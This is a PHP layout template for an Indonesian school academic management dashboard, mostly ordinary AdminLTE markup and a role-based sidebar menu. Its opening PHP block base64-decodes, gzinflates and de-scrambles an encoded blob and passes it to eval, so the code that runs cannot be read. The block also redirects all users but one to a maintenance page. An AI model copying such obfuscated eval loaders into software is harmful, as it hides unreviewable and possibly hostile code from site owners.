<!DOCTYPE html>

<?php
if($this->session->iduser){
  if($this->session->iduser!=61){
    redirect('page/maintenance');
  }   
}
$SISTEMIT_COM_ENC = "lZPNauMwEMfvgTzEikBt2LaypMgSxYXCnneXfYGCBsaHfBB8K20fSw8UDD5Y5KCDTsPCOmmgSZq0rE6ar9+M/pLGowmGvm2q1DTpKcvvxiO/XwEzWqz6p2zSb0J3fd9R14X18vo+xLajJs+f33PfVkMxNAR9djVf12F5dUh7pXlHRxWTVS2qPbttwrZBvaBlnxX5DbtlN+dC4hC5Q8j/R1wMyWP6IEBYPr4Jsx32uz9VYpVqyv3Liz/Mk5/k7c5csa19u1kviL07/d6bZmk2FLJTeYdpuk0qztzGnP7SPB+wAstC26kDRVG6UmtuAbjVJll0qIwxZZm4gV3Xr2DaGEgFoiBpOKdhT44kYLKJyxgFyBRFGQX7+A4ujTqLddu0+beKgQYwlNBZJaSwTkQlBZlCoULgUWmwkIxxzD/8/OG/gBmDkbTGsnQRpHCpUHw6Ra6AE0IpiNByxOmZSb2/oEDFfv3+w+5O81+PHUfmxxf++Y84KT/4KuPRPw==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="EMfvgTzEikBt2LaypMgSxYXCnneXfYGCBsaHfBB8K20fSw8UDD5Y5KCDTsPCOmmgSZq0rE6ar9+M/pLGowmGvm2q1DTpKcvvxiO/XwEzWqz6p2zSb0J3fd9R14X18vo+xLajJs+f33PfVkMxNAR9djVf12F5dUh7pXlHRxWTVS2qPbttwrZBvaBlnxX5DbtlN+dC4hC5";
?>
<html class="notranslate" translate="no">
<head>
  <meta name="google" content="notranslate" />
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <title><?= strtoupper($this->session->profil); ?> - SMART</title>
  <!-- Ionicons -->
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="<?php echo base_url();?>assets/AdminLTE2/plugins/fontawesome-free/css/all.min.css">
  <!-- overlayScrollbars -->
  <link rel="stylesheet" href="<?php echo base_url();?>assets/AdminLTE2/plugins/overlayScrollbars/css/OverlayScrollbars.min.css">
  <!-- SweetAlert2 -->
  <link rel="stylesheet" href="<?php echo base_url();?>assets/AdminLTE2/plugins/sweetalert2-theme-bootstrap-4/bootstrap-4.min.css">
    <!-- Toastr -->
  <link rel="stylesheet" href="<?php echo base_url();?>assets/AdminLTE2/plugins/toastr/toastr.min.css">
  <!-- Theme style 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.css">
-->
<link rel="stylesheet" href="<?php echo base_url();?>assets/AdminLTE2/bootstrap4.css">
  <link rel="stylesheet" href="https://cdn.datatables.net/1.10.20/css/dataTables.bootstrap4.min.css">
  <link rel="stylesheet" href="<?php echo base_url();?>assets/AdminLTE2/plugins/select2/css/select2.min.css">
<link rel="stylesheet" href="<?php echo base_url();?>assets/AdminLTE2/plugins/select2-bootstrap4-theme/select2-bootstrap4.min.css">
  <link rel="stylesheet" href="<?php echo base_url();?>assets/AdminLTE2/dist/css/adminlte.min.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">

  <link href="https://cdn.datatables.net/responsive/2.2.3/css/responsive.bootstrap4.min.css" rel="stylesheet">
  <link href="<?php echo base_url();?>assets/css/bootstrap-datetimepicker.min.css" rel="stylesheet" media="screen">

   <script src="<?php echo base_url();?>assets/AdminLTE2/plugins/jquery/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>

    <link href="https://cdn.jsdelivr.net/npm/summernote@0.8.16/dist/summernote-bs4.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/summernote@0.8.16/dist/summernote-bs4.min.js"></script>
  <!--<script src="https://cdn.tiny.cloud/1/x5rbssesmmg3prjzv47rddkoz7hmpvz7dfz8pirh46xkjg54/tinymce/5/tinymce.min.js" referrerpolicy="origin"></script>
  <script>
  tinymce.init({selector:'textarea'});
  -->
      <link href="https://cdn.jsdelivr.net/npm/summernote@0.8.16/dist/summernote-bs4.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/summernote@0.8.16/dist/summernote-bs4.min.js"></script>
 <script type="text/javascript">
     if(window.history.replaceState){
        window.history.replaceState(null,null,window.location.href);
      }
 </script>
</head>
<body class="hold-transition sidebar-mini layout-fixed layout-navbar-fixed layout-footer-fixed">
<div class="wrapper">
  <!-- Navbar -->
  <nav class="main-header navbar navbar-expand navbar-white navbar-light">
    <!-- Left navbar links -->
    <ul class="navbar-nav">
      <li class="nav-item">
        <a class="nav-link" data-widget="pushmenu" href="#"><i class="fas fa-bars"></i></a>
      </li>
      <li class="nav-item d-dm-inline-block">
        <a href="<?= base_url() ?>siswa/dashboard/" class="nav-link">Sistem Manajemen Akademik</a>
      </li>
     
    </ul>
    <!-- Right navbar links -->
    

    <ul class="navbar-nav ml-auto">
      <!-- Messages Dropdown Menu -->

      <!-- Notifications Dropdown Menu -->
      <li class="nav-item dropdown">
        <a class="nav-link" data-toggle="dropdown" href="#">
          <i class="far fa-user"></i>
          
        </a>
        <div class="dropdown-menu dropdown-menu-lg dropdown-menu-right">
          <span class="dropdown-item dropdown-header"><?= strtoupper($this->session->nama); ?></span>
          <div class="dropdown-divider"></div>
          <a href="<?= base_url().'login/out/' ?>" class="dropdown-item">
            <i class="fas fa-sign-out-alt"></i> Keluar
          </a>
          <div class="dropdown-divider"></div>
        </div>
      </li>
      
    </ul>
  </nav>
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <a href="index3.html" class="brand-link">
     <img src="<?= base_url().'image/logo.png' ?>" style="width: 180px;">
    </a>
    <!-- Brand Logo -->
    <!-- Sidebar -->
    <div class="sidebar" style="margin-top: 120px;">
      <!-- Sidebar user panel (optional) -->
      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <?php
          $hak=$this->session->idlevel;
          $query=$this->db->query("SELECT setmenu.idsetmenukategori,setmenukategori.kategori, count(setmenu.idsetmenukategori) AS jmlkategori, (SELECT COUNT(hakakses.idhakakses) FROM `hakakses` JOIN setfiturmenu ON setfiturmenu.idsetfiturmenu=hakakses.idsetfiturmenu JOIN setmenu ON setmenu.idsetmenu=setfiturmenu.idsetmenu WHERE hakakses.idlevel='$hak' AND setmenu.idsetmenukategori=setmenukategori.idsetmenukategori) AS hak, setmenukategori.icon FROM setmenu,setmenukategori WHERE setmenu.idsetmenukategori=setmenukategori.idsetmenukategori GROUP BY setmenu.idsetmenukategori ORDER BY setmenukategori.posisi asc");

          foreach ($query->result() as $key => $val) {
            # code...
            if($this->session->katmenu == $val->idsetmenukategori){
              $o='menu-open';
              $m='active';
            }else{
              $o='';
              $m='';
            }
            if($val->jmlkategori > 1 AND $val->hak > 0){
              ?>
              <li class="nav-item has-treeview <?= $o ?>">
                <a href="#" class="nav-link <?= $m ?>">
                  <i class="nav-icon <?= $val->icon ?>"></i>
                  <p>
                    <?= $val->kategori ?>
                    <i class="fas fa-angle-left right"></i>
                    <span class="badge badge-info right"></span>
                  </p>
                </a>
                <ul class="nav nav-treeview">
              <?php
            }
            $idsmk=$val->idsetmenukategori;
            $query2=$this->db->query("SELECT hakakses.*, sm.* FROM hakakses JOIN setfiturmenu ON setfiturmenu.idsetfiturmenu=hakakses.idsetfiturmenu JOIN setmenu AS sm ON sm.idsetmenu=setfiturmenu.idsetmenu JOIN setmenukategori ON setmenukategori.idsetmenukategori=sm.idsetmenukategori WHERE hakakses.idlevel='$hak' AND setmenukategori.idsetmenukategori='$idsmk' GROUP BY sm.idsetmenu ORDER BY setmenukategori.idsetmenukategori asc,sm.posisi asc");

            foreach ($query2->result() as $key => $v) {
              # code...
              if($this->session->menu == $v->idsetmenu){
                $m='active';
              }else{
                $m='';
              }
              
              if($v->menu!="Absensi Harian"){
              ?>
              <li class="nav-item">
                <a href="<?= base_url().$v->link ?>" class="nav-link <?= $m ?>">
                  <i class="far <?= $v->icon ?> nav-icon" ></i>
                  <p>
                    <?= $v->menu ?> 
                  </p>
                </a>
              </li>
              <?php
              }else{
                if($this->session->absensiharian || $this->session->profil=="guru"){
                  ?>
                    <li class="nav-item">
                    <a href="<?= base_url().$v->link ?>" class="nav-link <?= $m ?>">
                      <i class="far <?= $v->icon ?> nav-icon" ></i>
                      <p>
                        <?= $v->menu ?> 
                      </p>
                    </a>
                  </li>
                    <?php
                }

              }
            }

            if($val->jmlkategori > 1 AND $val->hak > 0){
              ?>
              </ul>
            </li>
              <?php
            }

          }
          
          ?>
          

          <?php
          if($this->session->idlevel=="SA"){
          ?>
          <li class="nav-item active">
            <a href="<?= base_url('page/hakakses') ?>" class="nav-link">
              <i class="nav-icon fas fa-eye-slash"></i>
              <p>
                Hak Akses
              </p>
            </a>
          </li>
          <?php
          }
          ?>
        </ul>
      </nav>
    </div>
  </aside>



  <aside class="control-sidebar control-sidebar-dark">
    <!-- Control sidebar content goes here -->
  </aside>
  <!-- /.control-sidebar -->
  <?php
  echo $_content;
  ?>
  <!-- Main Footer -->
  <br>
  <footer class="main-footer" style="margin-top: 5%;">
    <strong>Copyright &copy; 2020 Amico Techno Art.</strong>
    All rights reserved.
    <div class="float-right d-none d-sm-inline-block">
      <b>Version</b> 1.0
    </div>
  </footer>
</div>


<!-- Bootstrap -->
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- overlayScrollbars -->
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/overlayScrollbars/js/jquery.overlayScrollbars.min.js"></script>
<!-- AdminLTE App -->
<script src="<?php echo base_url();?>assets/AdminLTE2/dist/js/adminlte.js"></script>
<!-- SweetAlert2 -->
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/sweetalert2/sweetalert2.min.js"></script>
<!-- Toastr -->
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/toastr/toastr.min.js"></script>
<!-- OPTIONAL SCRIPTS -->
<script src="<?php echo base_url();?>assets/AdminLTE2/dist/js/demo.js"></script>

<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/tempusdominus-bootstrap-4/js/tempusdominus-bootstrap-4.min.js"></script>
<!-- Bootstrap Switch -->
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
<!-- PAGE PLUGINS -->
<!-- jQuery Mapael -->
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/jquery-mousewheel/jquery.mousewheel.js"></script>
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/raphael/raphael.min.js"></script>
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/jquery-mapael/jquery.mapael.min.js"></script>
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/jquery-mapael/maps/usa_states.min.js"></script>
<!-- ChartJS -->
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/chart.js/Chart.min.js"></script>

<!-- PAGE SCRIPTS -->
<script src="<?php echo base_url();?>assets/AdminLTE2/dist/js/pages/dashboard2.js"></script>
<!-- DATA TABLE -->
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/datatables/jquery.dataTables.js"></script>
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/datatables-bs4/js/dataTables.bootstrap4.js"></script>
<script src="https://cdn.datatables.net/responsive/2.2.3/js/dataTables.responsive.min.js"></script>
<script src="https://cdn.datatables.net/responsive/2.2.3/js/responsive.bootstrap4.min.js"></script>
<script type="text/javascript" src="<?php echo base_url();?>assets/js/bootstrap-datetimepicker.js" charset="UTF-8"></script>
<script type="text/javascript" src="<?php echo base_url();?>assets/js/locales/bootstrap-datetimepicker.id.js" charset="UTF-8"></script>
<script src="<?php echo base_url();?>assets/AdminLTE2/plugins/select2/js/select2.full.min.js"></script>

  <script type="text/javascript">
      $(function () {
    //Initialize Select2 Elements
            $('.select2').select2()

            //Initialize Select2 Elements
            $('.select2bs4').select2({
              theme: 'bootstrap4'
            })
        });
  </script>
</body>
</html>
  

<script>
  $(function () {
       $("#example1").DataTable({
            responsive: true,
            "scrollX": true
        });
       
        $("#example2").DataTable({
          "paging": true,
          "lengthChange": false,
          "searching": false,
          "ordering": true,
          "info": true,
          "autoWidth": false,
        });

        $("#example3").DataTable({
            responsive: true,
            "scrollX": true
        });

        $("#example4").DataTable({
            responsive: true,
            "scrollX": true,
            "iDisplayLength": 100,
        });
  });
  
  

</script>

